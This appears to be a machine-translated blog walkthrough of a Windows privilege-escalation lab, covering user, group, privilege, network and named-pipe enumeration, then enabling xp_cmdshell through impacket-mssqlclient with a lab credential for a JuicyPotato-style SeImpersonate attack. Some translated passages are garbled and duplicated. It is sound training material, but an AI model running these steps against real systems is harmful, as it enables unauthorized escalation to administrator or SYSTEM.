tasklist /svc | findstr 2400

</code></pre>
<p><strong>User &amp; Group information</strong> Users are often the weakest link in an organization, especially if the system is well configured and patched. It is critical to understand the users and groups in the system, specific group members who can provide administrator rights, the permissions of the current user, password policy information, and the logged-in users we may be targeting. We may think that the system has been strongly patched, but the user directory of the local administrators group has members who can browse it and contains files like <code>logins.xlsx</code> Such a password file, so it's easy to win.</p>
<p><strong>Logged-In Users</strong> It is always important to determine which users are logged into the system. Are they idle or active? Can we know for sure what they are doing? Although more challenging to execute, sometimes we can directly attack the user to escalate privileges or gain more access. In evasive engagement, we need to move carefully on the host while other users are doing it to avoid detection.</p>
<pre><code class="language-cmd-session">C:\htb&gt; query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
&gt;administrator         rdp-tcp#2           1  Active.  3/25/2021 9:27 AM</code></pre>
<p><strong>Current User</strong> When we access the host, we should first check the user environment in which the account is running. Sometimes, we are already systems or equal beings! Assume we gain access as a service account. In this case we might have something like <code>SeImpersonatePrivilege</code> Such permissions, which are often easily abused, use<a href="https://github.com/ohpe/juicy-potato" rel="noreferrer" target="_blank">Juicy Potato</a> Wait for tools to upgrade permissions.</p>
<pre><code class="language-cmd-session">C:\htb&gt; echo %USERNAME%

htb-student </code></pre>
<p><strong>Current user permissions</strong> As mentioned before, knowing what permissions a user has can help in elevating them. We will discuss individual user permissions and upgrade paths later in this module.</p>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<p><strong>Current user group information</strong> Do our users inherit any rights through group membership? Are they privileged within an Active Directory domain environment and can be used to access additional systems?</p>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192</code></pre>
<p><strong>Get all users</strong> It's also important to know the other users on the system. If we pass for user <code>bob</code> The captured credentials gain RDP access to the host and are seen in the local Administrators group <code>bob_adm</code> Users, it is worth checking whether credentials are reused. Can we access the user profile directories of important users? We may find valuable files, such as scripts with passwords or SSH keys, on the user's desktop, Documents, or Downloads folder.</p>
<pre><code class="language-cmd-session">C:\htb&gt; net user

User accounts for \\WINLPE-SRV01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
helpdesk                 htb-student              jordan
sarah                    secsvc
The command completed successfully.</code></pre>
<p><strong>Get all groups</strong> Knowing what non-standard groups exist on a host can help us determine the purpose of the host, how often it is accessed, and may even lead to the discovery of configuration errors, such as All Domain Users or the local Administrators group in a remote desktop.</p>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup

Aliases for \\WINLPE-SRV01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Storage Replica Administrators
*System Managed Accounts Group
*Users
The command completed successfully.</code></pre>
<p><strong>Details of a group</strong> It's worth checking out the details of non-standard groups. Although unlikely, we might find a password or other interesting information in the group's description. During the enumeration process, we may discover the credentials of another non-administrator user who is a member of a local group that can be used to escalate privileges.</p>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
helpdesk
sarah
secsvc
The command completed successfully. </code></pre>
<p><strong>Get password policies and other account information</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.</code></pre>
<h3>Interact with processes</h3>
<p>One of the best places to look for privilege escalation is in the processes running on your system. Even if a process is not running as administrator, it may gain additional privileges. The most common example is to find a web server like IIS or XAMPP running on the host and place <code>aspx/php</code> shell and obtain a shell as the user running the web server. Typically, this is not the administrator, but there will usually be <code>SeImpersonate</code> token, allow <code>Rogue/Juicy/Lonely Potato</code> Provide system permissions.</p>
<p><strong>Access Tokens Access Tokens</strong> In Windows, an access token is used to describe the security context (security attributes or rules) of a process or thread. The token contains user account identity information and permissions associated with a specific process or thread. When a user authenticates to the system, their password is verified against the secure database, and if authenticated correctly, they are issued an access token. Whenever a user interacts with a process, a copy of this token is displayed to determine their permission level.</p>
<h3>Enumerate network services</h3>
<p>The most common way people interact with processes is through network sockets (DNS, HTTP, SMB, etc.).<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat" rel="noreferrer" target="_blank">netstat</a> The command displays current TCP and UDP connections, which gives us a better idea of which services are listening on local and externally accessible ports. We may find a vulnerable service that can only be accessed after logging in to the local host, which can be used to escalate privileges.</p>
<p><strong>Show active network connections</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       3812
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       836
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       936
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5044
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       528
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       996
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1260
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2008
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       600
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       1888
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       616
  TCP    10.129.43.8:139        0.0.0.0:0              LISTENING       4
  TCP    10.129.43.8:3389       10.10.14.3:63191       ESTABLISHED     936
  TCP    10.129.43.8:49671      40.67.251.132:443      ESTABLISHED     1260
  TCP    10.129.43.8:49773      52.37.190.150:443      ESTABLISHED     2608
  TCP    10.129.43.8:51580      40.67.251.132:443      ESTABLISHED     3808
  TCP    10.129.43.8:54267      40.67.254.36:443       ESTABLISHED     3808
  TCP    10.129.43.8:54268      40.67.254.36:443       ESTABLISHED     1260
  TCP    10.129.43.8:54269      64.233.184.189:443     ESTABLISHED     2608
  TCP    10.129.43.8:54273      216.58.210.195:443     ESTABLISHED     2608
  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       3812

&lt;SNIP&gt;

  TCP    192.168.20.56:139      0.0.0.0:0              LISTENING       4
  TCP    [::]:21                [::]:0                 LISTENING       3812
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       836
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       936
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:8080              [::]:0                 LISTENING       5044
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       528
  TCP    [::]:49665             [::]:0                 LISTENING       996
  TCP    [::]:49666             [::]:0                 LISTENING       1260
  TCP    [::]:49668             [::]:0                 LISTENING       2008
  TCP    [::]:49669             [::]:0                 LISTENING       600
  TCP    [::]:49670             [::]:0                 LISTENING       1888
  TCP    [::]:49674             [::]:0                 LISTENING       616
  TCP    [::1]:14147            [::]:0                 LISTENING       3812
  UDP    0.0.0.0:123            *:*                                    1104
  UDP    0.0.0.0:500            *:*                                    1260
  UDP    0.0.0.0:3389           *:*                                    936

&lt;SNIP&gt;</code></pre>
<p>When using active network connections, the main thing to pay attention to is those on the loopback address (<code>127.0.0.1</code> and <code>:: 1</code>) that do not have a listening IP address (<code>10.129.43.8</code>) or broadcast address (<code>0.0.0.0</code>, <code>:: /0</code>). The reason is that network sockets on localhost are generally not secure because people think "they are not accessible from the network". The most obvious is <code>14147</code> Port number, used for FileZilla’s management interface. By connecting to this port, it may be possible to extract the FTP password, in addition to creating the c:\ of the f. P share as the FileZilla server user (possibly the administrator).</p>
<h3>named pipe</h3>
<p>Another way of communication between processes is through named pipes. Pipes are essentially files stored in memory that are cleared after reading. Cobalt Strike for each command (excluding<a href="https://www.cobaltstrike.com/help-beacon-object-files" rel="noreferrer" target="_blank">BOF</a>) using named pipes. The workflow is basically as follows:</p>
<p>The beacon started a pipe named \.\pipe\ msagent_12</p>
<p>The beacon starts a new process and injects commands into the process, directing output to \.\pipe\msagent_12</p>
<p>Server shows what is written to \.\pipe\ msagent_12</p>
<ol><li>Beacon starts a named pipe of \.\pipe\msagent_12</li><li>Beacon starts a new process and injects command into that process directing output to \.\pipe\msagent_12</li><li>Server displays what was written into \.\pipe\msagent_12</li></ol>
<p>This is done because if the command being executed is flagged by antivirus or crashes, it will not affect the beacon (the process that executed the command). Cobalt Strike users often replace named pipes to disguise themselves as another program. One of the most common examples is using mojo instead of msagent. One of my favorite discoveries was finding a named pipe launcher with Mojo, but the computer itself didn't have Chrome installed. Luckily, that’s exactly what the company’s internal red team does. It says a lot when outside consultants find the red team, but the internal blue team doesn’t.</p>
<p>Pipes are used for communication between two applications or processes, using shared memory. Pipes are divided into two types, named pipes and anonymous pipes. An example of a named pipe is <code>\\.\PipeName\\ExampleNamedPipeServer</code>. Windows systems use client-server for piped communication. In this implementation, the process that creates the named pipe is the server, and the process that communicates with the named pipe is the client. Named pipes can be accessed via <code>half-duplex</code> Communication, or one-way channel, where the client can only write data to the server; or dual <code>duplex</code>, a two-way communication channel that allows the client to write data through a pipe and the server to respond with data through the pipe. Each active connection to the named pipe server generates a new named pipe. These pipes have the same name but communicate through different data buffers.</p>
<p><strong>List named pipes with pipe list</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; pipelist.exe /accepteula

PipeList v1.02 - Lists open named pipes
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Pipe Name                                    Instances       Max Instances
---------                                    ---------       -------------
InitShutdown                                      3               -1
lsass                                             4               -1
ntsvcs                                            3               -1
scerpc                                            3               -1
Winsock2\CatalogChangeListener-340-0              1                1
Winsock2\CatalogChangeListener-414-0              1                1
epmapper                                          3               -1
Winsock2\CatalogChangeListener-3ec-0              1                1
Winsock2\CatalogChangeListener-44c-0              1                1
LSM_API_service                                   3               -1
atsvc                                             3               -1
Winsock2\CatalogChangeListener-5e0-0              1                1
eventlog                                          3               -1
Winsock2\CatalogChangeListener-6a8-0              1                1
spoolss                                           3               -1
Winsock2\CatalogChangeListener-ec0-0              1                1
wkssvc                                            4               -1
trkwks                                            3               -1
vmware-usbarbpipe                                 5               -1
srvsvc                                            4               -1
ROUTER                                            3               -1
vmware-authdpipe                                  1                1

&lt;SNIP&gt;</code></pre>
<p>Additionally, we can use PowerShell to use <code>gci</code> (<code>Get-ChildItem</code>) lists named pipes.</p>
<p><strong>List named pipes with PowerShell</strong></p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt;  gci \\.\pipe\


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 InitShutdown
------       12/31/1600   4:00 PM              4 lsass
------       12/31/1600   4:00 PM              3 ntsvcs
------       12/31/1600   4:00 PM              3 scerpc


    Directory: \\.\pipe\Winsock2


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              1 Winsock2\CatalogChangeListener-34c-0


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 epmapper

&lt;SNIP&gt;</code></pre>
<p>Once we have the list of named pipes, we can use<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" rel="noreferrer" target="_blank">Accesschk</a> Enumerate permissions for a specific named pipe by looking at the Discretionary Access List (DACL), which shows who has permission to modify, write, read, or execute the resource. let's take a look <code>LSASS</code> process. We can also use the command <code>.\accesschk.exe /accepteula \pipe\</code> to inspect the DACL of all named pipes.</p>
<h2>User permissions</h2>
<p>The permissions in mean that the account can be granted the right to perform various operations on the local system, such as managing services, loading drivers, shutting down the system, debugging applications, etc. Permissions are different from access rights, which are used by the system to grant or deny access to protectable objects. User and group permissions are stored in the database and are granted via access tokens when users log into the system. Accounts can have local permissions on specific computers, or have different permissions on different systems if the account belongs to an Active Directory domain. Whenever a user attempts to perform a privileged operation, the system checks the user's access token to confirm whether the account has the required permissions and, if so, whether those tokens are enabled. Most permissions are disabled by default. Some can be enabled by opening an administrative cmd.exe or PowerShell console, while others can be enabled manually.</p>
<p>The goal of the assessment is typically to gain administrative access to one or more systems. Suppose we can log into the system as a user with specific permissions. In this case, we may be able to leverage built-in functionality to directly escalate privileges, or leverage the privileges assigned to the target account to further escalate access to achieve our ultimate goal.</p>
<p><strong>Windows authorization process</strong> A security principal is anything that can be authenticated by a Windows operating system, including user and computer accounts, processes running within a security context, or other user/computer accounts, or security groups to which those accounts belong. Security principals are the primary way to control access to Windows host resources. Each security principal is identified by a unique security identifier (SID). When a security principal is created, it is assigned a SID that is assigned to the principal for its lifetime.</p>
<p>The following diagram explains at a high level the Windows authorization and access control process, which begins when a user attempts to access a securable object (such as a folder) in a file share. During this process, the user's access token (including its user SID, the SID of the group it belongs to, permission lists, and other access information) is compared to access control entries (ACEs) within the object's security descriptor (ACEs contain security information that protects the object, such as the access rights granted to the user or group, discussed below). Once the comparison is complete, a decision is made whether to grant access. Whenever a user attempts to access a resource on a Windows host, the entire process occurs almost instantaneously. As part of our enumeration and privilege escalation campaigns, we attempt to exploit and abuse access, leveraging or intervening in this authorization process to further advance access to targets.</p>
<img alt="Pasted image 20260228022956" src="assets/posts/windows-privilege-escalation/Pasted image 20260228022956.png"/>
<p><strong>Rights and Privileges in Windows, Rights and Privileges</strong> Windows contains many groups that give their members powerful rights and privileges. Many of these can be abused to escalate privileges in both standalone Windows hosts and Active Directory domain environments. Ultimately, these resources can be used to gain domain administrator, local administrator, or system privileges on a Windows workstation, server, or domain controller (DC). Some of these groups are listed below.</p>
<div class="post-table-wrap"><table><thead><tr><th><strong>Group Group</strong></th><th><strong>Description Description</strong></th></tr></thead><tbody><tr><td>Default administrator</td><td>Domain Administrators and Enterprise Administrators are "super" groups.</td></tr><tr><td>server operator</td><td>Members can modify services, access SMB shares, and backup files.</td></tr><tr><td>Spare</td><td>Members can log into the DC locally and should be considered domain administrators. They can make shadow copies of SAM/NTDS databases, read the registry remotely, and access file systems on the DC via SMB. This group sometimes joins a non-DC local backup group.</td></tr><tr><td>Print</td><td>Members can log into a local DC and "trick" Windows into loading a malicious driver.</td></tr><tr><td>Administrator</td><td>If a virtual datacenter exists, any virtualization administrator, such as a member of the Hyper-V Administrators, should be considered a domain administrator.</td></tr><tr><td>Account Operator</td><td>Members can modify non-protected accounts and groups within the domain.</td></tr><tr><td>remote desktop user</td><td>Members do not have any useful permissions by default, but are often granted additional permissions <code>Allow Login Through Remote Desktop Services</code>, for example, and can enable lateral movement via the RDP protocol.</td></tr><tr><td>Remotely manage users</td><td>Members can log into the DC via PSRemoting (the group is sometimes joined to a non-DC's local remote management group).</td></tr><tr><td>Group Policy Creator Owner</td><td>Members can create new GPOs, but need to be granted additional permissions to associate the GPO to a container, such as a domain or OU.</td></tr><tr><td>Schema manager</td><td>Members can modify the Active Directory schema structure by adding compromised accounts to the default object ACL and backdoor any Group/GPO to be created.</td></tr><tr><td>Administrator</td><td>Members can load DLLs on the DC but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL often causes the service to crash. A more reliable way to tap into this group is to create a WPAD record.</td></tr></tbody></table></div>
<p><strong>User rights transfer</strong> Users may have various permissions assigned to their accounts based on other factors such as group membership and permissions assigned through domain and local group policy. This Microsoft article about user rights transfer details each user permission that can be set in Windows and the security considerations that apply to each permission. Below are some key user rights assignments that apply to localhost. These permissions allow users to perform tasks on the system, such as logging in locally or remotely, accessing the host from the network, shutting down the server, etc.</p>
<div class="post-table-wrap"><table><thead><tr><th>Set constant</th><th>Set name</th><th>Standard work</th><th>Description</th></tr></thead><tbody><tr><td>SeNetworkLogonRight</td><td>Access this computer from the network](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network)</td><td>Administrator, authenticated user</td><td>Decide which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.</td></tr><tr><td>SeRemoteInteractiveLogonRight</td><td>Allow log on through Remote Desktop Services](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services)</td><td>Administrator, Remote Desktop User</td><td>This policy setting determines which users or groups can access the login interface of a remote device through a Remote Desktop Services connection. Users can establish a Remote Desktop Services connection to a specific server, but cannot log in to the server's console.</td></tr><tr><td>SeBackupPrivilege  SeeBackupPrivilege</td><td>Back up files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)</td><td>managers</td><td>This user permission determines which users can bypass file and directory, registry, and other persistent object permissions to back up the system.</td></tr><tr><td>SeSecurityPrivilege</td><td>Manage auditing and security log](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log)</td><td>managers</td><td>This policy setting determines which users can specify object access auditing options for individual resources, such as files, Active Directory objects, and registry keys. These objects have their system access control lists (SACLs) specified. Users granted this user permission can also view and clear the security log in Event Viewer.</td></tr><tr><td>privilege</td><td>take ownership of files or other objects](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)</td><td>managers</td><td>This policy setting determines which users can own any protectable object on the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.</td></tr><tr><td>SeDebugPrivilege</td><td>debugger</td><td>managers</td><td>This policy setting determines which users can connect to or open any process, even processes they do not own. Developers debugging applications do not need this user permission. Developers debugging new system components need this user right. This user right allows access to sensitive and critical operating system components.</td></tr><tr><td>Pretending to be privileged</td><td>Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)</td><td>Administrator, local service, network service, service</td><td>This policy setting determines which programs can impersonate the user or other specified accounts and act on the user's behalf.</td></tr><tr><td>SeLoadDriverPrivilege</td><td>Loading and unloading device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)</td><td>managers</td><td>This policy setting determines which users can dynamically load and unload device drivers. If there is already a signed driver for the new hardware in the driver.cab file on the device, you do not need to use this user right. Device drivers run as high-privilege code.</td></tr><tr><td>SeRestorePrivilege  SeeRestorePrivilege</td><td>Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories)</td><td>managers</td><td>This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when restoring backup files and directories. It determines which users can set valid security principals as owners of the object.</td></tr><tr><td>privilege</td><td>As part of the operating system](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system)</td><td>Administrator, local service, network service, service</td><td>This security setting determines whether a process can assume the identity of any user and thereby obtain the resources that the target user is allowed to access (impersonation). This may be assigned to an antivirus or backup tool that requires access to all system files for scanning or backup. This permission should be reserved for service accounts that require legitimate access.</td></tr></tbody></table></div>
<p>Enter command <code>whoami /priv</code> A list of all user permissions assigned to your current user will be displayed. Some permissions are only open to administrator users and can only be listed or exploited when running elevated commands or PowerShell sessions. These concepts of elevated privileges and User Account Control (UAC) are security features introduced in Windows Vista that by default restrict applications from running with full privileges unless necessary. If we compare the rights an administrator has on a non-elevated console and an upgraded console, we see that they differ significantly.</p>
<p>The following are the permissions available to the local administrator account on Windows systems</p>
<p><strong>Local Administrator User Privileges - Elevate</strong></p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami 

winlpe-srv01\administrator


PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled </code></pre>
<p>When our account is <code>Disabled</code> " status, it means that our account has that privilege. However, until it is enabled, it cannot be used with an access token to perform related actions. Windows does not have built-in commands or PowerShell cmdlets to enable permissions, so we need some scripts to help. In this module, we will see ways to abuse various privileges, and various ways to implement specific privileges in the current process. An example is this PowerShell script, which can be used to enable certain permissions, or this script can be used to adjust token permissions.</p>
<p>In comparison, ordinary users have few permissions</p>
<p><strong>Ordinary user rights</strong></p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami 

winlpe-srv01\htb-student


PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<p>User rights increase based on the groups they are assigned to or the permissions they are assigned. The following is an example of rights granted to users in a backup group. This group of users has additional rights that UAC currently limits. However, from this order we can see that they have<a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/shut-down-the-system" rel="noreferrer" target="_blank">SeShutdownPrivilege</a>, which means they can shut down a domain controller, potentially causing huge service disruptions if they log into the domain controller locally (rather than via RDP or WinRM).</p>
<p><strong>Backup Operators Rights, backup rights</strong></p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<p><strong>Detection</strong></p>
<p>This <a href="https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e" rel="noreferrer" target="_blank">post</a> is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672" rel="noreferrer" target="_blank">4672: Special privileges assigned to new logon</a> which will generate an event if certain sensitive privileges are assigned to a new logon session. This can be fine-tuned in many ways, such as by monitoring privileges that should _never_ be assigned or those that should only ever be assigned to specific accounts. This article is worth reading to learn more about Windows Permissions and information to detect and prevent abuse, in particular by logging event 4672: Special permissions assigned to new logins, which is an event raised if a new login session is assigned certain sensitive permissions. This can be fine-tuned in a number of ways, such as monitoring permissions that should not be assigned, or permissions that should only be assigned to specific accounts.</p>
<h3>SeImpersonate and SeAssignPrimaryToken permissions</h3>
<p>In Windows, each process has a token that contains information about the account under which it runs. These tokens are not considered secure resources as they are simply memory locations in memory that can be brute-forced by a user who cannot read the memory. To use this token, you need to have <code>impersonation</code> privilege. This protection is only granted to administrative accounts and in most cases can be removed during the system hardening process. An example of using this token is<a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" rel="noreferrer" target="_blank">CreateProcessWithTokenW</a>.</p>
<p>A legitimate program can leverage the token of another process to escalate from administrator to the local system, which has additional privileges. A process typically obtains a SYSTEM token by calling the WinLogon process, then executes itself with the token and places it in SYSTEM space. Attackers often abuse this permission in "potato-style" private accounts - service accounts can <code>impersonation</code>, but cannot obtain full system-level permissions. Essentially, the Potato attack tricks a process running as SYSTEM into connecting to its own process and handing over a token for use.</p>
<p>We typically obtain this permission after gaining remote code execution through an application running in the context of a service account (for example, uploading a web shell to a web app in ASP. NET, remote code execution through a Jenkins installation, or executing commands through an MSSQL query). Whenever we gain access in this way, we should immediately check for permissions, as its presence often provides a quick and easy way to gain higher privileges. This article is worth reading to learn more details about token impersonation attacks.</p>
<p><strong>Selmpersonate Example - JuicyPotato</strong>Let's take the following example where we gain a foothold on the SQL server via a privileged SQL user. Clients can be configured to use Windows authentication when connecting to IIS and SQL Server. The server may then need to access other resources, such as file shares, as a connecting client. This can be achieved by impersonating the context user established by the client connection. For this purpose, the service account will be authorized to "impersonate the client" after authenticating the permissions.</p>
<p>In this case, the SQL Service service account runs under the default <code>mssqlserver</code> in the account context. Imagine we go through <code>Snaffler</code> The tool implements command execution, and users use <code>xp_cmdshell</code> Obtained from file sharing <code>logins.sql</code> A set of credentials in a file.</p>
<p>Utilize credentials <code>sql_dev: Str0ng_P@ssw0rd！</code>, we first connect to the SQL server instance and confirm permissions. we can use <code>Impacket</code> in toolkit<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py" rel="noreferrer" target="_blank">mssqlclient.py</a> to achieve this.</p>
<ol><li>Connecting with MSSQLClient.py</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ impacket-mssqlclient sql_dev@10.129.28.157 -windows-auth

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL&gt;</code></pre>
<p>Next we have to enable <code>xp_cmdshell</code> Stored procedures to run operating system commands. We can do this by typing <code>enable_xp_cmdshell</code> To implement the Impacket MSSSQL shell. input <code>help</code> Some additional command options are displayed.</p>
<ol><li>Enabling xp_cmdshell</li></ol>
<pre><code class="language-shell-session">SQL&gt; enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install</code></pre>
<p>With this access, we can confirm that we are indeed running within the context of the SQL Server service account.</p>
<ol><li>Confirming Access</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell whoami

output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01</code></pre>
<ol><li>Checking Account Privileges</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell whoami /priv

output                                                                             

--------------------------------------------------------------------------------   
                                                                    
PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
